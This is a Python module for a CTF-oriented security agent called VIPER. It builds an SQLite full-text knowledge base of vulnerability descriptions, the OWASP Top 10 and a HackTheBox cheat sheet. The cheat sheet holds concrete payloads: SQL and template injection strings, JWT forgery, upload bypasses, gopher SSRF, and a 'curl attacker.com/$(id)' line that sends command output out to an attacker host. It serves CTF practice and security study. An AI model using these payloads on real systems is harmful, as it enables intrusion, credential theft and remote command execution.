"""
VIPER 5.0 - Knowledge Base (SQLite FTS5)
==========================================
Lightweight knowledge base using SQLite full-text search.
Zero-dependency SQLite FTS5 alternative to heavyweight
vector-DB / graph-DB / reranker stacks — same retrieval
concept, VIPER's local-first philosophy.

Sources: viper_knowledge.py attack patterns, MITRE CWE/CAPEC,
OWASP top 10, common vulnerability descriptions.
"""

import json, logging, os, sqlite3
from pathlib import Path
from typing import Dict, List, Optional

logger = logging.getLogger("viper.core.knowledge_base")

HACKAGENT_DIR = Path(__file__).parent.parent
KB_DB_PATH = HACKAGENT_DIR / "data" / "knowledge_base.db"

class KnowledgeBase:
    def __init__(self, db_path=None):
        self.db_path = str(db_path or KB_DB_PATH)
        self._ensure_db()

    def _ensure_db(self):
        """Create FTS5 table if not exists and seed with built-in knowledge."""
        # Create DB dir if needed
        Path(self.db_path).parent.mkdir(parents=True, exist_ok=True)
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("""
            CREATE VIRTUAL TABLE IF NOT EXISTS kb_chunks USING fts5(
                title, content, source, category, tokenize='porter'
            )
        """)
        # Check if already seeded
        count = c.execute("SELECT COUNT(*) FROM kb_chunks").fetchone()[0]
        if count == 0:
            self._seed(conn)
        conn.commit()
        conn.close()

    def _seed(self, conn):
        """Seed KB with VIPER's built-in knowledge."""
        c = conn.cursor()
        entries = []

        # 1. Load from viper_knowledge.py
        try:
            from core.viper_knowledge import ATTACK_KNOWLEDGE
            if isinstance(ATTACK_KNOWLEDGE, dict):
                for category, attacks in ATTACK_KNOWLEDGE.items():
                    if isinstance(attacks, list):
                        for attack in attacks:
                            if isinstance(attack, dict):
                                entries.append((
                                    attack.get("name", category),
                                    json.dumps(attack) if not isinstance(attack.get("description",""), str) else attack.get("description", str(attack)),
                                    "viper_knowledge",
                                    category,
                                ))
                            else:
                                entries.append((category, str(attack), "viper_knowledge", category))
                    elif isinstance(attacks, dict):
                        entries.append((category, json.dumps(attacks), "viper_knowledge", category))
                    else:
                        entries.append((category, str(attacks), "viper_knowledge", category))
        except Exception as exc:
            logger.debug("viper_knowledge load failed: %s", exc)

        # 2. Common vulnerability descriptions (built-in)
        vulns = [
            ("SQL Injection", "SQL injection allows attackers to interfere with database queries. Use parameterized queries, prepared statements, stored procedures. Test with single quotes, UNION SELECT, time-based blind payloads. Common in login forms, search, URL parameters. CWE-89.", "builtin", "injection"),
            ("Cross-Site Scripting (XSS)", "XSS allows injection of client-side scripts. Types: reflected, stored, DOM-based. Test with <script>alert(1)</script>, event handlers, SVG payloads. Mitigate with output encoding, CSP, HttpOnly cookies. CWE-79.", "builtin", "injection"),
            ("Server-Side Request Forgery (SSRF)", "SSRF forces server to make requests to unintended locations. Test internal IPs (127.0.0.1, 169.254.169.254), cloud metadata endpoints, protocol smuggling (gopher://, file://). CWE-918.", "builtin", "ssrf"),
            ("Insecure Direct Object Reference (IDOR)", "IDOR allows access to objects by modifying identifiers. Test by changing numeric IDs, UUIDs, filenames in requests. Check horizontal and vertical privilege escalation. CWE-639.", "builtin", "access_control"),
            ("Cross-Site Request Forgery (CSRF)", "CSRF tricks users into executing unwanted actions. Test for missing CSRF tokens, SameSite cookie attribute, Origin/Referer validation. CWE-352.", "builtin", "csrf"),
            ("XML External Entity (XXE)", "XXE exploits XML parsers to read files, SSRF, or DoS. Test with <!DOCTYPE> declarations, external entity references, parameter entities. CWE-611.", "builtin", "injection"),
            ("Remote Code Execution (RCE)", "RCE allows executing arbitrary commands on the server. Test deserialization flaws, template injection, command injection, file upload bypass. CWE-94.", "builtin", "rce"),
            ("Authentication Bypass", "Auth bypass circumvents login mechanisms. Test default credentials, JWT alg:none, session fixation, OAuth state parameter, password reset flaws. CWE-287.", "builtin", "auth"),
            ("Path Traversal", "Path traversal reads files outside intended directory. Test with ../, ....// , URL encoding, null bytes. Target /etc/passwd, web.config, .env files. CWE-22.", "builtin", "file_access"),
            ("CORS Misconfiguration", "CORS misconfig allows cross-origin data theft. Test with Origin: null, Origin: attacker.com, wildcards with credentials. Check Access-Control-Allow-Origin reflection. CWE-942.", "builtin", "cors"),
            ("Server-Side Template Injection (SSTI)", "SSTI injects template directives to achieve RCE. Test {{7*7}}, ${7*7}, #{7*7} in user inputs. Common in Jinja2, Twig, Freemarker, Velocity. CWE-1336.", "builtin", "injection"),
            ("GraphQL Vulnerabilities", "GraphQL attacks include introspection disclosure, batched query DoS, alias-based rate limit bypass, nested query depth bombs, field suggestion enumeration. Test __schema query first.", "builtin", "graphql"),
            ("WebSocket Vulnerabilities", "WebSocket attacks include CSWSH (cross-site WebSocket hijacking), message injection, auth bypass on upgrade, origin validation bypass. Test by replaying upgrade request from attacker origin.", "builtin", "websocket"),
            ("Race Conditions", "Race conditions exploit TOCTOU timing windows. Test with parallel requests for coupon redemption, balance transfers, vote manipulation. Use last-byte sync technique for precision.", "builtin", "logic"),
            ("Business Logic Flaws", "Logic flaws bypass intended workflows. Test step-skipping in multi-step processes, negative quantity purchases, privilege escalation via role parameter manipulation, hidden field tampering.", "builtin", "logic"),
            ("OAuth/OIDC Vulnerabilities", "OAuth attacks include authorization code interception, redirect_uri manipulation, state parameter bypass, PKCE downgrade, token leakage via referer, JWT algorithm confusion.", "builtin", "auth"),
            ("Subdomain Takeover", "Subdomain takeover occurs when DNS points to deprovisioned services (S3, Heroku, GitHub Pages, Azure). Check for NXDOMAIN or specific error pages on CNAME targets.", "builtin", "dns"),
            ("HTTP Request Smuggling", "Request smuggling exploits discrepancies between front-end and back-end HTTP parsing. Test CL.TE, TE.CL, TE.TE variants. Use Content-Length and Transfer-Encoding header conflicts.", "builtin", "smuggling"),
            ("Cache Poisoning", "Web cache poisoning injects malicious responses into caches. Test unkeyed headers (X-Forwarded-Host, X-Original-URL), parameter cloaking, fat GET requests.", "builtin", "cache"),
            ("Prototype Pollution", "JS prototype pollution modifies Object.prototype via __proto__, constructor.prototype. Test in query params, JSON body, URL fragments. Can escalate to XSS or RCE.", "builtin", "injection"),
        ]
        entries.extend(vulns)

        # 3. OWASP Top 10 2021
        owasp = [
            ("A01:2021 Broken Access Control", "Most common vulnerability. Includes IDOR, privilege escalation, CORS misconfig, metadata manipulation, JWT tampering, forced browsing.", "owasp", "access_control"),
            ("A02:2021 Cryptographic Failures", "Sensitive data exposure through weak crypto. Check TLS versions, cipher suites, password hashing (bcrypt vs MD5), key management, data at rest encryption.", "owasp", "crypto"),
            ("A03:2021 Injection", "SQL, NoSQL, OS command, LDAP, XPath, SSTI injection. Use parameterized APIs, allowlist validation, LIMIT queries to prevent mass disclosure.", "owasp", "injection"),
            ("A04:2021 Insecure Design", "Design-level flaws not fixable by code. Threat modeling, secure design patterns, reference architectures, abuse case testing.", "owasp", "design"),
            ("A05:2021 Security Misconfiguration", "Default configs, open cloud storage, verbose errors, unnecessary features, missing hardening. Check default credentials, directory listing, stack traces.", "owasp", "config"),
            ("A06:2021 Vulnerable Components", "Known CVEs in dependencies. Check npm audit, pip-audit, OWASP Dependency-Check. Monitor NVD, GitHub advisories.", "owasp", "supply_chain"),
            ("A07:2021 Auth Failures", "Credential stuffing, brute force, session fixation, weak passwords. Implement MFA, rate limiting, secure session management, password policies.", "owasp", "auth"),
            ("A08:2021 Software and Data Integrity", "Deserialization flaws, unsigned updates, CI/CD pipeline compromise. Verify signatures, use SRI, review CI/CD permissions.", "owasp", "integrity"),
            ("A09:2021 Logging and Monitoring", "Insufficient logging enables extended attacks. Log auth events, access control failures, input validation failures. Alert on suspicious patterns.", "owasp", "monitoring"),
            ("A10:2021 SSRF", "Server-Side Request Forgery. Validate/sanitize all client-supplied URLs. Use allowlists for remote resources. Disable HTTP redirections.", "owasp", "ssrf"),
        ]
        entries.extend(owasp)

        c.executemany(
            "INSERT INTO kb_chunks(title, content, source, category) VALUES (?,?,?,?)",
            entries,
        )
        logger.info("KB seeded with %d entries", len(entries))

    def search(self, query: str, top_k: int = 5, category: str = None) -> List[Dict]:
        """Full-text search with BM25 ranking."""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        # FTS5 MATCH query with BM25 ranking
        fts_query = query.replace('"', '""')
        if category:
            c.execute(
                """SELECT title, content, source, category, rank
                   FROM kb_chunks
                   WHERE kb_chunks MATCH ? AND category = ?
                   ORDER BY rank
                   LIMIT ?""",
                (fts_query, category, top_k),
            )
        else:
            c.execute(
                """SELECT title, content, source, category, rank
                   FROM kb_chunks
                   WHERE kb_chunks MATCH ?
                   ORDER BY rank
                   LIMIT ?""",
                (fts_query, top_k),
            )
        rows = c.fetchall()
        conn.close()
        return [
            {"title": r[0], "content": r[1], "source": r[2],
             "category": r[3], "score": abs(r[4])}
            for r in rows
        ]

    def add(self, title: str, content: str, source: str = "manual", category: str = "general"):
        """Add a knowledge chunk."""
        conn = sqlite3.connect(self.db_path)
        conn.execute(
            "INSERT INTO kb_chunks(title, content, source, category) VALUES (?,?,?,?)",
            (title, content, source, category),
        )
        conn.commit()
        conn.close()

    def count(self) -> int:
        conn = sqlite3.connect(self.db_path)
        n = conn.execute("SELECT COUNT(*) FROM kb_chunks").fetchone()[0]
        conn.close()
        return n

    def refresh_from_ctf(self):
        """Seed KB with HTB/CTF-specific knowledge: flag formats, common
        challenge tropes, writeup patterns, tool recipes."""
        ctf_entries = [
            ("HTB Flag Format",
             "HackTheBox flags follow the format HTB{...} where ... is a string "
             "of 8-200 characters. Case-sensitive. Sometimes lowercase htb{}. "
             "Always report the EXACT string including braces.",
             "ctf_htb", "ctf_flag_format"),
            ("CTF Web Challenge Quick Wins",
             "Always check first: /robots.txt, /.git/, /.env, page source HTML "
             "comments, /flag, /flag.txt, /admin. Source maps (*.js.map) leak "
             "original code. Try ?debug=1 query param. View-source reveals "
             "dev comments. Check HTTP response headers for unusual values "
             "(X-Flag, X-Debug-Flag).",
             "ctf_htb", "ctf_web_tricks"),
            ("CTF SQL Injection Patterns",
             "Simple SQLi: ' OR 1=1-- . UNION SELECT: ' UNION SELECT 1,2,flag FROM flags-- . "
             "Blind boolean: ' AND SUBSTRING(password,1,1)='a'-- . Time-based: "
             "' AND SLEEP(5)-- . Second-order: store payload, execute later. "
             "SQLite: ' UNION SELECT name FROM sqlite_master-- . Mongo: "
             "{$ne:null} or {$regex:'.'}",
             "ctf_htb", "ctf_sqli"),
            ("CTF JWT Attacks",
             "alg:none: set header to {\"alg\":\"none\"}, empty signature. "
             "Weak secret brute force: jwt_tool, hashcat -m 16500. Common "
             "secrets: 'secret', 'jwt_secret', 'changeme', 'supersecret'. "
             "Algorithm confusion: RS256 to HS256 using public key as HMAC "
             "secret. kid injection: {\"kid\":\"../../../etc/passwd\"}.",
             "ctf_htb", "ctf_jwt"),
            ("CTF SSTI Payloads",
             "Jinja2 (Python): {{7*7}} confirms, {{config}} leaks settings, "
             "{{''.__class__.__mro__[1].__subclasses__()}} for RCE. "
             "Twig (PHP): {{_self.env.registerUndefinedFilterCallback('system')}} "
             "{{_self.env.getFilter('id')}}. Handlebars: {{#with this}}. "
             "ERB (Ruby): <%= system('id') %>. Velocity: #set($str=$class.inspect)",
             "ctf_htb", "ctf_ssti"),
            ("CTF Prototype Pollution",
             "JS prototype pollution: POST body {\"__proto__\":{\"admin\":true}} "
             "or {\"constructor\":{\"prototype\":{\"isAdmin\":true}}}. Check for "
             "Object.prototype modification: Object.prototype.isAdmin should "
             "be undefined. Common sinks: lodash.merge, jQuery.extend, "
             "util._extend. RCE via child_process if gadgets available.",
             "ctf_htb", "ctf_proto"),
            ("CTF PHP Tricks",
             "Type juggling: 0==\"abc\" is true, \"0e123\"==\"0e456\" is true. "
             "strcmp(array, string) returns NULL == 0 (bypass). preg_match "
             "with \\A but input has newline. Deserialization: O:8:\"User\":1:"
             "{s:5:\"admin\";b:1;}. LFI + PHP wrappers: php://filter/convert."
             "base64-encode/resource=index.php. PHAR deserialization via "
             "phar:// wrapper.",
             "ctf_htb", "ctf_php"),
            ("CTF Node.js / Express Tricks",
             "qs query parsing: ?a[]=1&a[]=2 gives a=['1','2']. Prototype "
             "pollution via merge. SSRF via URL parser disagreement. "
             "insecure eval/Function via user input. node-serialize unserialize "
             "with IIFE: _$$ND_FUNC$$_ prefix. express static serves from "
             "current directory if misconfigured.",
             "ctf_htb", "ctf_node"),
            ("CTF Python Tricks",
             "Pickle deserialization: custom __reduce__ for RCE. Jinja2 SSTI "
             "for flask. eval() on user input. pyyaml.load without Loader. "
             "format string on user input: '{0.__class__.__mro__[1].__subclasses__()}' "
             ".format(thing). Python 2 input() vs raw_input(). Flask session "
             "cookie decode (flask-unsign).",
             "ctf_htb", "ctf_python"),
            ("CTF Git Repo Exposure",
             "If /.git/config is accessible, use git-dumper to clone: "
             "git-dumper http://target.com/.git /tmp/clone. Check git log for "
             "flags in commit messages, deleted files, .env files committed "
             "by accident. Look at refs/heads, HEAD. git show <hash> for "
             "specific commits. git log --all --full-history to include "
             "deleted content.",
             "ctf_htb", "ctf_git"),
            ("CTF Source Map Extraction",
             "If /static/js/main.abc123.js.map is accessible, download and "
             "use 'sourcemap' npm tool or online parsers to recover original "
             "source (usually TypeScript/JSX). Flags often embedded as "
             "hardcoded strings in the recovered source. Search recovered "
             "code for HTB\\{, FLAG\\{, process.env, secret.",
             "ctf_htb", "ctf_sourcemaps"),
            ("CTF Race Conditions",
             "Turbo Intruder last-byte sync. Concurrent requests to /redeem, "
             "/transfer, /vote, /upvote. Coupon reuse (same code used N times "
             "before DB lock). Balance transfer (withdraw full amount in "
             "parallel). Voucher creation (user can create multiple with "
             "same email). Use burp turbo-intruder race-single-packet.py.",
             "ctf_htb", "ctf_race"),
            ("CTF Weak Crypto Patterns",
             "ECB mode: same plaintext -> same ciphertext blocks. CBC padding "
             "oracle: bit-flipping, PaddingOracle tool. Stream cipher key "
             "reuse: XOR two ciphertexts to remove keystream. Weak RNG: "
             "Math.random seeded with Date.now(). Hash length extension "
             "(hashpump) on MD5/SHA1 MAC. Cookie signed with HMAC but "
             "algorithm leaks.",
             "ctf_htb", "ctf_crypto"),
            ("CTF Auth Bypass Tricks",
             "SSO callback: redirect_uri manipulation to attacker.com. OAuth "
             "state parameter missing/predictable. Forgot-password token "
             "leak in response. SQL injection in login form (admin'--). "
             "Host header injection for password reset URL. JWT none alg. "
             "Cookie role=user flip to role=admin. X-Forwarded-For bypass "
             "of IP allowlist.",
             "ctf_htb", "ctf_auth"),
            ("CTF Info Disclosure Spots",
             "Error pages: Django debug (yellow), Flask debug (werkzeug "
             "console), Laravel debug (ignition), Rails (better_errors), "
             "PHP (phpinfo). Backup files: index.php.bak, .swp, .swo, .orig, "
             "~, .old. Log files: /var/log/apache2/access.log, "
             "/var/log/nginx/error.log. Comments: HTML, CSS, JS source. "
             "Headers: X-Powered-By, Server, Set-Cookie paths.",
             "ctf_htb", "ctf_info_leak"),
            ("CTF Command Injection",
             "Shell metacharacters: ;, |, &, &&, ||, `, $(). Newline injection: "
             "%0a or \\n. Blind CI via time: `sleep 5`. Blind CI via DNS: "
             "`curl attacker.com/$(id)`. Filter bypass: ${IFS}, $IFS$9, "
             "{cat,/etc/passwd}. Null byte truncation: file.png%00.php.",
             "ctf_htb", "ctf_cmdi"),
            ("CTF File Upload Bypass",
             "Double extension: shell.php.jpg. Null byte: shell.php%00.jpg. "
             "Case variation: shell.PhP. Polyglot file: PDF-PHP, GIF-JS, "
             "PDF-ZIP. MIME type spoof (send image/jpeg with PHP content). "
             ".htaccess upload to execute custom extensions. ZIP symlink "
             "traversal. SVG with embedded <script>.",
             "ctf_htb", "ctf_upload"),
            ("CTF SSRF to RCE",
             "Cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS), "
             "http://metadata.google.internal/ (GCP), http://169.254.169.254/"
             "metadata/v1/ (DO). Gopher smuggling: gopher://127.0.0.1:6379/_"
             "<redis commands>. Dict: dict://127.0.0.1:11211/stats. "
             "file:// for local file read. Chain: SSRF -> redis -> "
             "master-slave replication RCE.",
             "ctf_htb", "ctf_ssrf"),
            ("CTF Tools Quick Reference",
             "sqlmap --batch --dbs -u 'http://...' — auto SQLi. "
             "ffuf -u 'URL/FUZZ' -w wordlist.txt -fc 404 — directory fuzz. "
             "jwt_tool <token> — JWT attacks. hashcat -m <hash-type> hash.txt "
             "wordlist — cracking. gobuster vhost -u URL -w wordlist — vhost. "
             "feroxbuster -u URL -w wordlist -x php,html — recursive. "
             "wfuzz, arjun for param discovery. dnsrecon, sublist3r for DNS.",
             "ctf_htb", "ctf_tools"),
            ("HTB Writeup Pattern",
             "Typical HTB web challenge: 1) Visit target, read description "
             "for hints. 2) View source, robots.txt, .git. 3) Identify tech "
             "stack (PHP, Node, Flask, etc). 4) Test inputs for injection "
             "(SQLi, NoSQL, SSTI). 5) If auth present, test JWT/cookies. "
             "6) If file upload, test bypasses. 7) If multi-step flow, test "
             "step skipping / IDOR. 8) Check API endpoints (/api, /graphql). "
             "9) Flag usually accessible after exploitation, often at /flag "
             "or in the database.",
             "ctf_htb", "ctf_workflow"),
        ]

        conn = sqlite3.connect(self.db_path)
        added = 0
        for title, content, source, category in ctf_entries:
            try:
                conn.execute(
                    "INSERT INTO kb_chunks(title, content, source, category) VALUES (?,?,?,?)",
                    (title, content, source, category),
                )
                added += 1
            except Exception as exc:
                logger.debug("CTF entry insert failed: %s", exc)
        conn.commit()
        conn.close()
        logger.info("KB refreshed: %d CTF entries added", added)
        return added

    def refresh_from_mitre(self):
        """Load CWE/CAPEC data from VIPER's offline MITRE database."""
        mitre_dir = HACKAGENT_DIR / "data" / "mitre_db"
        if not mitre_dir.exists():
            return 0
        added = 0
        conn = sqlite3.connect(self.db_path)
        for json_file in mitre_dir.glob("*.json"):
            try:
                data = json.loads(json_file.read_text(encoding="utf-8"))
                items = data if isinstance(data, list) else data.get("items", data.get("weaknesses", data.get("attack_patterns", [])))
                if not isinstance(items, list):
                    continue
                for item in items[:500]:
                    if isinstance(item, dict):
                        title = item.get("name", item.get("id", json_file.stem))
                        desc = item.get("description", item.get("summary", str(item)))
                        if isinstance(desc, list):
                            desc = " ".join(str(d) for d in desc)
                        conn.execute(
                            "INSERT INTO kb_chunks(title, content, source, category) VALUES (?,?,?,?)",
                            (str(title)[:200], str(desc)[:2000], "mitre", json_file.stem),
                        )
                        added += 1
            except Exception as exc:
                logger.debug("MITRE load %s failed: %s", json_file.name, exc)
        conn.commit()
        conn.close()
        logger.info("KB refreshed: %d MITRE entries added", added)
        return added
